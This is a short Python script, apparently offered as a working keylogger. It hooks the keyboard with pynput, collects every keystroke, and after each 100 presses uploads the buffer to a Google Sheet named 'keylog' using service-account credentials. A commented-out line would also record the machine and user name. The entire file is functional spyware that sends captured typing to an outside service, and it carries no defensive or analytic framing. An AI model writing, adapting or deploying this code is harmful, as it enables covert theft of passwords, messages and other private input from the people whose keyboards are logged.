from pynput.keyboard import Key, Listener
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import os

scope = ['https://www.googleapis.com/auth/spreadsheets', "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name('client_secret.json', scope)
client = gspread.authorize(creds)
sheet = client.open("keylog").sheet1
actual_key = ""
nb_key_pressed = 0

#logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    #row = [os.environ['COMPUTERNAME'], os.environ['USERNAME'], str(key)]
    global actual_key
    global nb_key_pressed
    actual_key += str(key) + " ; "
    nb_key_pressed += 1
    if nb_key_pressed>100:
        row = [actual_key]
        index = 1
        sheet.insert_row(row, index)
        actual_key=""
        nb_key_pressed = 0


with Listener(on_press=on_press) as listener:
    listener.join()
